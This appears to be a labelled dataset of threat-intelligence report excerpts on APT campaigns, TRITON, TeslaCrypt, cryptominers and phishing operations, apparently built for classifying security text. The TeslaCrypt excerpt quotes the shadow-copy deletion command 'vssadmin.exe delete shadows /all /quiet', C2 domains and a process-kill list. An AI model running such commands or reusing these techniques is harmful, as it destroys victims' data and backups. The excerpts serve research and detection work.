Based on observations on infrastructure, and the state of the code, we believe these incidents represent the first attempts to deploy the agent, and features such as persistence do not appear to work. Instead, MacDownloader is a simple exfiltration agent, with broader ambitions. The macOS malware also mirrors the approach of the ExtremeDownloader dropper previously documented in our research, and samples of the latter identified during this time used the same infrastructure. Lastly, the exposure of test victim data and code references provide a unique insight into the development of the malware, with potential connections to agents developed by long dormant threat groups. Since the Technical Preview of our forthcoming Carnegie Endowment publication about state-sponsored espionage campaigns was released at Black Hat USA, we have continued to disclose information about current Iranian activities in order to promote public education and to provide indicators of compromise.

We have not attributed the incident to a threat actor, though we believe the activity is consistent with a nation state preparing for an attack. TRITON is one of a limited number of publicly identified malicious software families targeted at industrial control systems (ICS) . It follows Stuxnet which was used against Iran in 2010 and Industroyer which we believe was deployed by Sandworm Team against Ukraine in 2016. TRITON is consistent with these attacks, in that it could prevent safety mechanisms from executing their intended function, resulting in a physical consequence. Malware Family Main Modules Description TRITON trilog.exe Main executable leveraging libraries.zip library.zip Custom communication library for interaction with Triconex controllers. Table 1: Description of TRITON Malware Incident Summary The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message. We assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage",1

Throughout the research, we found numerous indications that the authors and operators of this IoT Botnet are operating out of China. Of course, all these indications can be forged. However the sheer volume of evidence as well as locations, still leads us to conclude that these indications are true to a very high degree of probability. We can also reveal that part of the C&C infrastructure was previously registered under the email ‘ [email protected] ’. This same email address was also used to register domains belonging to a Chinese APT Group dubbed ‘ The Black Vine ’.

Our investigation indicates that the developers of these infected apps are not to blame, but are more likely victims themselves.

The use of multiple stages of Powershell with various stages being completely fileless indicates an attacker who has taken significant measures to avoid detection. Ironically, the author of the malware called SourceFire out in the malware code itself shortly after we released Cisco Umbrella, a security product specifically designed to protect organizations from DNS and web based threats as described here . Details What initially drew our interest to this particular malware sample was a tweet published by security researcher on Twitter (thanks simpo !) regarding a Powershell script that he was analyzing that contained the base64 encoded string 'SourceFireSux'. Interestingly enough, Sourcefire was the only security vendor directly referenced in the Powershell script. We searched for the base64 encoded value 'UwBvAHUAcgBjAGUARgBpAHIAZQBTAHUAeAA=' which was referenced in the tweet, and were able to identify a sample that had been uploaded to the public malware analysis sandbox, Hybrid Analysis . Additionally, when we searched for the decoded string value we found a single search engine result that pointed to a Pastebin page . The hash listed in the Pastebin led us to a malicious Word document that had also been uploaded to a public sandbox. The Word document initiated the same multiple-stage infection process as the file from the Hybrid Analysis report we previously discovered and allowed us to reconstruct a more complete infection process. Analyzing our telemetry data, we were ultimately able to identify additional samples, which are listed in the Indicators of Compromise section of this post. As a security vendor, we know that we are doing something right when malware authors begin to specifically reference us within their malware. Naturally we decided to take a closer look at this particular sample. In this particular case, we began by analyzing the Powershell file that had been incorrectly submitted to the",0

On occasion the attackers directly included the ROKRAT payload in the malicious document and during other campaigns the attackers leveraged multi-stage infection processes: the document only contained a downloader designed to download ROKRAT from a compromised web server. Additionally, the ""FreeMilk"" campaign targeted several non-Korean financial institutions. In this campaign, the attackers made use of a malicious Microsoft Office document, a deviation from their normal use of Hancom documents. This document exploited a newer vulnerability, CVE-2017-0199. Group 123 used this vulnerability less than one month after its public disclosure. During this campaign, the attackers used 2 different malicious binaries: PoohMilk and Freenki. PoohMilk exists only to launch Freenki. Freenki is used to gather information about the infected system and to download a subsequent stage payload. This malware was used in several campaigns in 2016 and has some code overlap with ROKRAT. Finally, we identified a 6th campaign that is also linked to Group 123. We named this 6th campaign ""Are You Happy?"". In this campaign, the attackers deployed a disk wiper. The purpose of this attack was not only to gain access to the remote infected systems but to also wipe the first sectors of the device. We identified that the wiper is a ROKRAT module. This actor was very active this year and continued to mainly focus on South Korea. The group leveraged spear phishing campaigns and malicious documents the contents of which included very specific language suggesting that they were crafted by native Korean speakers rather than through the use of translation services. The actor has the following demonstrated capabilities: To include exploits (for Hangul and Microsoft Office) in its workflows. To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms. To use HTTPS communications to make it harder to perform traffic analysis. To compromise third parties to forge realistic spear phishing campaigns (i.e. Yonsei university in the ""Golden Time"" campaign). To constantly evolve, the new fileless capability included in 2018 is a proof. The Timeline Here is the timeline for 2017 and the beginning of 2018: August 2016 to March 2017: ""Golden Time"" Campaign As with the majority of Group 123 campaigns, the initial attack vector during this campaign was spear phishing. Talos identified two different kinds of emails. The first email we discovered was the most interesting. In this sample, we observed the attackers praising the user for joining a",1

The emails had subject lines that were intended to convince unsuspecting recipients that they were from a legitimate source. Examples included fake commercial suppliers or shipping companies sending an updated price list, banks asking customers to validate banking information, or confirmation of equipment delivery. Some examples of the phishing emails Documents attached in the emails are RTF files containing an exploit for the CVE-2015-1641 vulnerability which are detected by Kaspersky Lab security products as Exploit.MSWord.Agent.hp .

In the second half of 2016, ESET researchers identified a unique malicious toolset that was used in targeted cyberattacks against high-value targets in the Ukrainian financial sector. We believe that the main goal of attackers using these tools is cybersabotage. This blog post outlines the details about the campaign that we discovered. We will refer to the gang behind the malware as TeleBots. However it’s important to say that these attackers, and the toolset used, share a number of similarities with the BlackEnergy group, which conducted attacks against the energy industry in Ukraine in December 2015 and January 2016 .

This name is not common among Farsi speakers, since they have a variant for it pronounced as “Ghasem”, a fact that may further imply the target’s identity.

We observed an elevation in the sophistication of social engineering methods employed by the group. In the context of this campaign the attackers impersonated an academic researcher and an officer from the US State Department . Feigning an on-going correspondence, the attackers addressed the target and sent him an acrobat pdf file presenting a letter signed by the US official, containing the phishing link. Once the target fills his credentials, the attackers check if the account can be accessed without 2FA. If unsuccessful, the target will be directed to another phishing page dedicated to steal two-factor identification. Once the attackers gained the email credentials, they immediately changed the email account’s passwords, resulting in the target losing access to their email. TTPs Emails This attack is committed in two steps. First, the attackers create a fake correspondence between two emails they got control of , with the malicious file attached, then they share the “alleged” correspondence with the target. Phase one: Figure A : the first email address allegedly belongs to a leading officer in the US Department of State (fake email address). Figure B : the second email address is associated with an Israeli academic researcher. This address is fake as well and was used in previous attacks by the group. In the initial email, actually sent among themselves, the attackers create the false pretense of a legitimate correspondence to gain the target's trust. In the fake correspondence The “US official” mentions attending a convention at a research institute and meeting the researcher and discussing the subject of the email. As part of the email thread, the alleged US official attached a password protected acrobat pdf file, with the password being the last four digits of the researcher’s phone number. In the following email, the researcher shares the correspondence with the target and relays details from his research and attach the pdf file. The researcher requests the target’s discretion several times to avoid “exposing the information”. The target is sent two “essential” files: Pdf file, allegedly sent by the US official",0

Decoy documents are legitimate benign documents that are opened after the malicious payload is delivered, thus ensuring that the victim does not become suspicious because their expected document opened as expected. Two samples were found to include the decoy document show in Figure 1. The title of the document roughly translates to “Ministry of Communications & Departments Authorities Empty Sites and Hosted Public Works Source Clearance Photos”. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong, or Macau. However, based on the Taiwanese subject matter in this document, we can safely come to the conclusion that the intended victim was of Taiwanese origin.

Over the course of their campaigns, we analyzed their modus operandi and dissected their tools of the trade—and uncovered common denominators indicating that PLEAD, Shrouded Crossbow, and Waterbear may actually be operated by the same group. PLEAD PLEAD is an information theft campaign with a penchant for confidential documents. Active since 2012, it has so far targeted Taiwanese government agencies and private organizations. PLEAD’s toolset includes the self-named PLEAD backdoor and the DRIGO exfiltration tool. PLEAD uses spear-phishing emails to deliver and install their backdoor, either as an attachment or through links to cloud storage services. Some of the cloud storage accounts used to deliver PLEAD are also used as drop off points for exfiltrated documents stolen by DRIGO.

Had his friends clicked on the attachment sent from the email impersonating Rasul, the file would have in fact installed a keylogger that recorded the user’s keystrokes and malware that relayed screenshots of their computers back to the attacker, potentially compromising all of their passwords, contacts and private communications. In order to not raise suspicion, the malware also opened an Office document in Azeri dealing with political prisoners, so the victim would have no reason to think their computer had been infected. Amnesty International, working with others, discovered that this email was part of a sustained spearphishing campaign targeting Azerbaijani activists over thirteen months — one that frequently employed the tactic of impersonating well-known human rights defenders. When he became aware of the attack Rasul immediately feared that the Azerbaijani security services could be behind it. Given his background, this is understandable. In April 2015, Rasul was sentenced to six and a half years in prison, on politically-motivated charges stemming from his work exposing human rights abuses in Azerbaijan in the run up to the 2012 Eurovision Song Contest in the country. Amnesty International considered him a prisoner of conscience and demanded his immediate and unconditional release. The European Court of Human Rights also found that his detention was in violation of human rights law. He was ultimately pardoned after serving more than a year and a half in prison. Rasul’s experience of being impersonated was not unique. Azerbaijani activists and human rights defenders who spoke to Amnesty International cited other instances in which they had been impersonated, or had their accounts compromised. Leyla Yunus , who is also a former prisoner of conscience, and who was also impersonated as part of the malware campaign, recalled that many times over the years, especially in the run-up to her imprisonment in",0

Additionally, others have been referring to the group responsible for the OilRig campaign itself as the OilRig group as well. To that end, we are elevating the OilRig attack campaign to be known as the OilRig group. In July 2017, we observed the OilRig group using a tool they developed called ISMAgent in a new set of targeted attacks. The OilRig group developed ISMAgent as a variant of the ISMDoor Trojan. In August 2017, we found this threat group has developed yet another Trojan that they call ‘Agent Injector’ with the specific purpose of installing the ISMAgent backdoor. We are tracking this tool as ISMInjector. It has a sophisticated architecture and contains anti-analysis techniques that we have not seen in previous tools developed by this threat group. The complex structure and inclusion of new anti-analysis techniques may suggest that this group is increasing their development efforts in order to evade detection and gain higher efficacy in their attacks. The Attack On August 23, 2017, we observed OilRig targeting an organization within the United Arab Emirates government. The attack involved a spear-phishing email that had a subject of “Importan Issue” and two Zip archives attached, as seen in Figure 1. Note that “Important” is misspelled in the sample as shown below.

This analysis of security researcher Claudio Guarnieri was originally written for The Left in German Bundestag . We’re publishing it here with permission from The Left. Von diesem Bericht existiert auch eine deutsche Übersetzung . Summary of Findings Two suspicious artifacts have been retrieved from two separate servers within the Die Linke infrastructure. One is an open source utility used to remotely issue commands on a Windows host from a Linux host. The other is a custom utility which, despite its large size, has limited functionality and acts as a tunnel, possibly used by the attackers to maintain persistence within the compromised network. The combination of the two utilities seems to be enough for the attackers to maintain a foothold inside the network, harvest data, and exfiltrate all the information they deemed interesting. It is, however, possible that there are additional malicious artifacts which have not yet been discovered. Attributes of one of the artifacts and intelligence gathered on the infrastructure operated by the attackers suggest that the attack was perpetrated by a state-sponsored group known as Sofacy (or APT28 ). Previous work published by security vendor FireEye in October 2014 suggests the group might be of Russian origin.

For this analysis, I’ll be using a PE32 version AgentTesla file seen in the wild on August 29 th with hash “ca29bd44fc1c4ec031eadf89fb2894bbe646bc0cafb6242a7631f7404ef7d15c”. You’ll find AgentTesla delivered commonly via phishing documents that usually contain VBA macros to download and run a file – like the one in question. As it’s a commercial product, you’ll find a lot of variety in the initial carrier files that deliver the AgentTesla binary; however, at some point you’ll find yourself with a PE. Thus, begins the journey… I suppose the first layer of obfuscation really begins with the file itself, called “one.jpeg.png.exe” and an icon of a JPG trying to create an illusion of legitimacy. This is a common technique to fool people and they’ve taken it one step further by opening an image when you execute the binary. The first executable is a .NET application, which is no surprise since AgentTesla is very well known for being a .NET key logger. To analyze .NET applications, I prefer to use the application dnSpy and, once loading up this sample, we can see there is only one namespace of interest with a handful of functions and a byte array. The Japanese kanji stands out at first glance but I believe this is less about language and more about being a form of obfuscation – I’ll explain why shortly.

The key point of the fileless infection for the attacker is to be able to evaluate each compromised system and make a decision whether the infection process should continue or vanish without a trace. The cybercriminal group Lurk was one of the first to effectively employ fileless infection techniques in large-scale attacks—techniques that arguably became staples for other malefactors. A typical Lurk infection uses browser exploits to deliver non-persistent payloads to potential victims, probing their targets before deploying additional malware. The infection chain had multiple stages, and was accomplished using bodiless/fileless exploit payloads executed in-memory without additional persistence mechanisms. No traces were left on affected systems apart from files from the exploit process if the target machine wasn’t interesting to the Lurk operators. This eponymous lurking behavior would earn them notoriety until their operations were stymied and the perpetrators arrested. Nine more suspected members of the group were arrested by Russia’s Ministry of Internal Affairs on February 8. Lurk was believed to have siphoned over $45 million from financial organizations, ultimately disrupting the victims’ operations, reputation, and bottom line.

From mid-2016 through early 2017, APT33 compromised a U.S. organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings. During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals. More recently, in May 2017, APT33 appeared",1

Only this time, it’s a Hangul Word Processor (HWP) document leveraging the already known CVE-2015-2545 Encapsulated PostScript (EPS) vulnerability. HWP is a popular alternative to Microsoft Office in South Korea, especially within government agencies. So it is not uncommon for attackers to use this attack vector for spear phishing Korean-speaking targets. In this particular campaign, the contents of the discovered malicious documents are related to some of the political issues in the country. This too is very common approach for malware operations targeting public institutions. Aside from this campaign’s motivation, what grabbed our attention was the way it utilizes pCloud, a free cloud service, for data storage and communication. Although this technique has been used before by other malware campaigns, it is still not a common strategy.

Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related. The MuddyWater attacks are primarily against Middle Eastern nations. However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA. MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based first stage backdoor we call “POWERSTATS”.

Another interesting finding is the use of the recently discovered CVE 2017-0199 vulnerability, and Microsoft Access files into which the download scripts were embedded to reduce the likelihood of their detection. Traces of mobile malware that started to appear from late April 2017, are also being investigated. Recent targets for the group seem to be varied in nature; the attackers do not appear to be choosing targets selectively, but rather seeking different kinds of MENA intelligence.

By targeting primarily financial-related keyword searches and ensuring that their malicious results are displayed, the attacker can attempt to maximize the conversion rate of their infections as they can be confident that infected users will be regularly using various financial platforms and thus will enable the attacker to quickly obtain credentials, banking and credit card information, etc. The overall configuration and operation of the infrastructure used to distribute this malware was interesting as it did not rely on distribution methods that Talos regularly sees being used for the distribution of malware. This is another example of how attackers regularly refine and change their techniques and illustrates why ongoing consumption of threat intelligence is essential for ensuring that organizations remain protected against new threats over time. Initial Attack Vector The initial vector used to initiate this infection process does not appear to be email based. In this particular campaign, the attacker(s) targeted specific sets of search keywords that are likely to be queried by potential targets using search engines such as Google. By leveraging compromised web servers, the attacker was able to ensure that their malicious results would be ranked highly within search engines, thus increasing the likelihood that they would be clicked on by potential victims. In one example, the attacker appeared to target the keyword search containing the following search query: In most instances, the attacker was able to get their poisoned results displayed several times on Page 1 of the Search Engine Results Page (SERP) for the keyword search being targeted, in this case ""al rajhi bank working hours in ramadan"".

Curiously, the Word document does not contain any macros, or even an exploit. Rather, it uses a technique recently reported on by SensePost , which allows an attacker to craft a specifically created Microsoft Word document, which uses the Dynamic Data Exchange (DDE) protocol. DDE traditionally allows for the sending of messages between applications that share data, for example from Word to Excel or vice versa.

Smartphones are the dominant form of internet access in the region and Xinjiang was recently above the national average of internet users in China. The result is a large online population who have been the subject of numerous cyber-attacks in the past . Once installed, HenBox steals information from the devices from a myriad of sources, including many mainstream chat, communication, and social media apps. The stolen information includes personal and device information. Of note, in addition to tracking the compromised device’s location, HenBox also harvests all outgoing phone numbers with an “86” prefix, which is the country code for the People’s Republic of China (PRC). It can also access the phone’s cameras and microphone. HenBox has ties to infrastructure used in targeted attacks with a focus on politics in South East Asia. These attackers have used additional malware families in previous activity dating to at least 2015 that include PlugX, Zupdax, 9002, and Poison Ivy. This also aligns with HenBox’s timeline, as in total we have identified almost 200 HenBox samples, with the oldest dating to 2015. Most of the samples we found date from the last half of 2017, fewer samples date from 2016, and a handful date back to 2015. In 2018, we have already observed a small but consistent number of samples. We believe this indicates a fairly sustained campaign that has gained momentum over recent months.

Specifically, the app was an Android Package (APK) file that will be discussed in more detail shortly. The domain name, language of the site and app content hosted suggest this site is a third-party app store for whom the intended users are the Uyghurs. Such app stores are so-called because they are not officially supported by Android, nor are they provided by Google, unlike the Play Store. Third-party app stores are ubiquitous in China for a number of reasons including: evermore powerful Chinese Original Equipment Manufacturers (OEM), a lack of an official Chinese Google Play app store, and a growing smartphone market.

Hurricane Electric Redirection In March of 2014, we detected Kaba (aka PlugX or SOGU) callback traffic to legitimate domains and IP addresses. Our initial conclusion was that this traffic was the result of malicious actors ‘sleeping’ their implants, by pointing their command and control domains at legitimate IP addresses. As this is a popular technique, we did not think much of this traffic at the time. Further analysis revealed that the HTTP headers of the traffic in question contained a Host: entry for legitimate domains. As we have previously observed malware families that forge their HTTP headers to include legitimate domains in callback traffic, we concluded that the malware in this case was configured in the same way. An example of the observed traffic is as follows: POST /C542BB084F927229348B2A34 HTTP/1.1 Accept: */* CG100: 0 CG103: 0 CG107: 61456 CG108: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; SLCC2; .NET CLR",1

All of these domains were registered by the same entity and they were resolving to the same IP. Only the PE binary file was directly hosted on the index page without any browser exploit (in general, browser exploits are delivered via third party software exploits such as JavaScript or Flash). However, an HTML IFRAME tag that was embedded inside the malware binary was being used to force the web browser to download its copy as a file named “Photo.scr”. This filename is perhaps designed to entice the human victim to click on the file and check the “Photo” that was downloaded. In the absence of a browser exploit mechanism, this appears to be a social engineering attack, where the attacker would trick a user into downloading and executing the binary hosted on this site. The page contents were downloaded and analyzed by FireEye team members. The SCR file had a md5sum: aba2d86ed17f587eb6d57e6c75f64f05.

572,Long_Train,"are only going to give a quick introduction on the dropper’s architecture and the setup function because this functionality has been widely covered. Most TeslaCrypt samples use COM+ sandbox evasion techniques. For example, the dropper we analysed uses simple detection code that verifies if the “URLReader2” COM interface has been correctly installed in the DirectShow filter graph list: If the check passes, the real dropper is extracted and executed using a well-known method that makes use of the ZwMap(Unmap)ViewOfSection API functions to unmap the original PE memory image and re-map another image file. The final unpacked executable locates specific Windows directories such as the Application Data directory, and builds support files like the “key.dat” file, and files to store decryption instructions. The executable also adjusts its own privileges (adds “SeDebugPrivilege”) and copies itself using a random file name to the user’s Application Data directory. A new process is then spawned and execution is transferred to it. The original dropper file is deleted. The main malware window is created and five threads are spawned, followed by the window message dispatching cycle. TeslaCrypt threads perform the following: Delete all system Volume Shadow Copies by executing “vssadmin.exe delete shadows /all /quiet” command Open the “key.dat” file and recover encryption keys. If “key.dat” file doesn’t exist, create the keys and store them in an encrypted form in the “key.dat” file. Send the new master encryption key to the C&C server through POST request (the latest sample that we have analysed contains the following C&C server URLs: 7tno4hib47vlep5o.63ghdye17.com 7tno4hib47vlep5o.79fhdm16.com 7tno4hib47vlep5o.tor2web.blutmagie.de 7tno4hib47vlep5o.tor2web.fi Implement anti-tampering protection: every 200 milliseconds, TeslaCrypt enumerates all running processes and if a process with a filename that contains any of the words below is found, that process is terminated using the TerminateProcess Windows API function taskmgr procexp regedit msconfig cmd.exe File Encryption – Introduction After the initialization routine and the deletion of the Volume Shadow copies, the sample creates the “key.dat” file where it stores all the encryption keys. The dropper from March 2015 calculates at least 2 different main keys: a payment key and a master encryption key. The other dropper implements the concept of an additional key known as the “Recovery key’. “GetAndHashOsData” is the function responsible for creating the base buffer for the generation of all keys. At startup it acquires the following info: the global workstation’s LAN network statistics, using the NetStatisticsGet API function 64 random bytes generated by Windows Crypto functions all heap descriptors of its own process all active process descriptors and the threads descriptors of each process all loaded modules in each process the workstation’s physical memory information Once the data is acquired, it generates a big array of SHA1 values, one for every 20 bytes of acquired data. At the end it calculates and stores a global SHA1 value for the entire array, in a symbol that we have called “g_lpGlobalOsDataSha1”. With these 2 items, the “FillBuffWithEncryptedOsData” routine is able to fill a generic buffer with the calculated data, in a pseudo-random manner. A master key and a payment key are generated using this function (each key is 32 bytes wide), their SHA256 is calculated and finally a custom algorithm is used to shift left and shift right the 2 keys. The two shifted SHA256 values are stored in the “key.dat” file. The Key File The “ OpenKeyFileAndWrite ” routine tries to open the “key.dat” file, located in the user’s Application Data directory. If it doesn’t exist, it generates the 2 master keys (3 in case of the most recent dropper) as well as other keys, and stores them in the key file. Here is a little schema of the layout of the “key.dat” file: * = We currently don’t know precisely how this value is used by TeslaCrypt The latest version of the dropper creates a “RECOVERY_KEY.TXT” file inside the user’s document directory. It does this to achieve a particular goal: if the victim workstation is offline or if a firewall blocks the communication with the C&C server, the dropper will proceed with the destruction of the master key inside the “key.dat” file, after the encryption of all files has been completed.

Talos also observed the introduction of new code that allows Floki Bot to make use of the Tor network. However, this functionality does not appear to be active for the time being. Finally, through the use of the FIRST framework during the analysis process, Talos was able to quickly identify code/function reuse between Zeus and Floki Bot. This made sample analysis more efficient and decreased the amount of time spent documenting various functions present within the Floki Bot samples we analyzed. Talos worked in collaboration with Flashpoint during the analysis of Floki Bot. This collaborative effort allowed Talos and Flashpoint to quickly communicate intelligence data related to active campaigns distributing Floki Bot as well as data regarding the technical functionality present within the malware. Additionally, Talos is making scripts available to the open source community that will help malware analysts automate portions of the Floki Bot analysis process and make the process of analyzing Floki Bot easier to perform.

590,Long_Train,"we are able to estimate that the number of victims affected by this operation is roughly around 15 million people worldwide. This same telemetry provides insights into the most heavily targeted areas involving this campaign, which impacts southeast Asia, northern Africa, and South America the most. However, it’s important to note that the actual number of victims is likely much higher because less than half of the samples we identified in this campaign leverage bitly. If we postulate that the bitly telemetry is typical for this operation, we can extrapolate to speculate that as many as 30 million people have been affected by this operation. While the actual number could be more or less, this does serve to give an idea of the possible size and scope of this large scale operation. The attackers make heavy use of VBS files and use various online URL shortening services to install and run the XMRig payload. Additionally, the attackers mask the wallets used by leveraging XMRig proxy services on the hosts to which they are connected. Delivery To date, we have observed over 250 unique Microsoft Windows PE files in this Monero cryptocurrency mining campaign. Over half of these samples were downloaded from the 4sync online cloud",1
591,Long_Train,"While the computing resources within most IoT devices are generally limited, the number of exposed devices that are vulnerable to publicly available exploits is high which may make them attractive to cyber criminals moving forward. To put the financial gains in perspective, an average system would likely generate about $0.25 of Monero per day, meaning that an adversary who has enlisted 2,000 victims (not a hard feat), could generate $500 per day or $182,500 per year. Talos has observed botnets consisting of millions of infected systems, which using our previous logic means that these systems could be leveraged to generate more than $100 million per year theoretically. It is important to note that due to volatility present across cryptocurrency markets, these values may change drastically from day to day. All calculations in this blog were made based on XMR/USD at the time of this writing. This is all done with minimal effort following the initial infection. More importantly, with little chance of being detected, this revenue stream can continue in perpetuity. While these are impressive figures, it's also important to factor in a few details that can further increase the value of these attacks exponentially: The value of many cryptocurrencies are skyrocketing. Monero, one of the most popular mining targets, saw a 3000% increase over the last 12 months. These attacks are much stealthier than their predecessors. Attackers are not stealing anything more than computing power from their victims and the mining software isn't technically malware -- So theoretically, the victims could remain part of the adversary's botnet for as long as the attacker chooses. Once the currency is mined, there is no telling what the attacker might do with it. This could become a long term investment (or even retirement) scheme for these attackers – sitting on this currency until it hits such a point where the attacker decides to cash in. Introduction Throughout the past couple of years ransomware has dominated the threat landscape and for good reason. It creates a highly profitable business model that allows attackers to directly monetize their nefarious activities. However, there are a couple of limitations with the use of ransomware. First is the fact that only a small percentage of infected users will actually pay the ransom demanded by the attacker. Second, as systems and technology get better at detecting and blocking ransomware attacks the pool of possible victims is changing. Potential victims in many countries lack the financial capabilities to pay $300-$500 to retrieve their data. Possibly related to these aforementioned limitations, we have begun to see a steady shift in the payloads that are being delivered. This is especially true for some of the most common methods for malware distribution such as exploit kits and spam campaigns. Over the past several months Talos has started to observe a marked increase in the volume of cryptocurrency miners being delivered to victims. Cryptocurrency and ""blockchain"" have been all over the news over the past several months as the value of these currencies has increased on an exponential path. One of the most effective ways to generate these currencies is through mining and adversaries are obviously paying attention. What is 'Mining'? At a high level mining is simply using system resources to solve large mathematical calculations which result in some amount of cryptocurrency being awarded to the solvers. Before we get too deep into mining let's address the currencies that make sense to mine. Bitcoin (BTC) is the most well known and widely used cryptocurrency by a",1

The length of outgoing ‘datagrams’ are limited to 60 characters, though DNS server configurations and the actual protocol permit this value to be larger.

A typical query sent to the C&C server looks like this: n.n.c.<Session ID >.<Server domain>.com Structure of transport layer request and response There is a session layer protocol in place above the DNS tunnel transport layer, which implies the ability to exchange ‘short’ and ‘long’ packets. It differs from the transport layer in that it has a mechanism to check for lost messages. While a transport layer session closes with the exchange of data on the number of packets sent and received, a session layer closes by checking that every sent packet has been received correctly.

Additionally, the attacker filters connections based on their User-Agent strings, and only enables their infrastructure for short periods of time before blocking all connections.

Weaponizing documents to exploit known Microsoft Word vulnerabilities is a common tactic deployed by many adversary groups, but in this example, we discovered RTF documents containing embedded OLE Word documents further containing embedded Adobe Flash (.SWF) files, designed to exploit Flash vulnerabilities rather than Microsoft Word. We have named this tool that generates these documents DealersChoice. In addition to the discovery of this new tactic, we were able to identify two different variants of the embedded SWF files: the first being a standalone version containing a compressed payload which we have dubbed DealersChoice.A and a second variant being a much more modular version deploying additional anti-analysis techniques which we have dubbed DealersChoice.B. The unearthing of DealersChoice.B suggests a possible code evolution of the initial DealersChoice.A variant.

The campaign has many stages of the infection chain and all needed to be unraveled before the final payload level was reached.

Stage 1 - email The email message contains two attachments. The first one is a Word document in the Office Open XML file format while the second is a ZIP file PurchaseOrders.zip, containing an executable file PurchaseOrders.exe.

Interestingly, the C2 infrastructure is also somewhat different than that used by Elise. Targeting In contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we’ve collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include: An Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online. Copy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover. Copy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo. Copy of the official Taiwan holiday schedule for 2016, which is the 105 th anniversary of the current Taiwanese government. Figure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region Wang Huangguang. Evolve to Survive: TTP Shifts and Infrastructure We’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor-registered and DDNS, with the actor-registered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report. Also new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing-wen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power.

There have been numerous reports on their activities, to the extent that a Wikipedia entry has even been created for them. From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS. The Linux malware Fysbis is a preferred tool of Sofacy, and though it is not particularly sophisticated, Linux security in general is still a maturing area, especially in regards to malware. In short, it is entirely plausible that this tool has contributed to the success of associated attacks by this group. This blog post",1

Regarding the command and control (C2) infrastructure, Tick previously used domains registered through privacy protection services to keep their anonymity, but have moved to compromised websites in recent attacks. With multiple tools and anonymous infrastructure, they are running longstanding and persistent attack campaigns.

659,Long_Train,"are also seeing Scarlet Mimic start to expand its espionage efforts from PCs to mobile devices, marking an evolution in its tactics. Individuals and groups of all different types may become the target of cyber espionage campaigns. The most well known victims of cyber espionage are typically government organizations or high-tech companies, but it’s important to recognize that espionage-focused adversaries are tasked to collect information from many sources. The attacks we attribute to Scarlet Mimic have primarily targeted Uyghur and Tibetan activists as well as those who are interested in their causes. Both the Tibetan community and the Uyghurs, a Turkic Muslim minority residing primarily in northwest China, have been targets of multiple sophisticated attacks in the past decade. Both also have history of strained relationships with the government of the People’s Republic of China (PRC), though we do not have evidence that links Scarlet Mimic attacks to the PRC. Scarlet Mimic attacks have also been identified against government organizations in Russia and India, who are responsible for tracking activist and terrorist activities. While we do not know the precise target of each of the Scarlet Mimic attacks, many of them align to the patterns described above. The Scarlet Mimic attacks primarily center around the use of a Windows backdoor named “FakeM.” It was first described by Trend Micro in 2013 and was named FakeM because its primary command and control traffic mimicked Windows Messenger and Yahoo! Messenger network traffic to evade detection. We have identified two subsequent variants of the FakeM family, which has undergone significant changes since it was exposed in 2013. We have also identified nine distinct “loader” malware families, which Scarlet Mimic appears to use to avoid detection when infecting a system. In addition to the FakeM variants, Scarlet Mimic has deployed Trojans that target the Mac OS X and Android operating systems. We have linked these attacks to Scarlet Mimic through analysis of their command and control (C2) infrastructure. To infect individuals with access to the data the actors desire, Scarlet Mimic deploys both spear-phishing and watering hole (strategic web compromise) attacks. Using these tactics they can directly target previously identified individuals (spear phishing) as well as unidentified individuals who are interested in a specific subject (watering hole). In their spear phishing attacks, Scarlet Mimic has exploited five separate vulnerabilities. However, in many cases they chose to forgo exploiting a software vulnerability and used self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension, tricking victims into opening executable files. As with many other attackers who use spear-phishing to infect victims, Scarlet Mimic makes heavy use of “decoy” files. These are legitimate documents that contain content relevant to the subject of the spear phishing e-mail. After the system is infected, the malware displays the decoy document to trick the user into believing nothing harmful has occurred. These decoy documents allow us to identify the theme of the spear phishing e-mail and in some cases the target of the attack. The most recent Scarlet Mimic attacks we have identified were conducted in 2015 and suggest the group has a significant interest in both 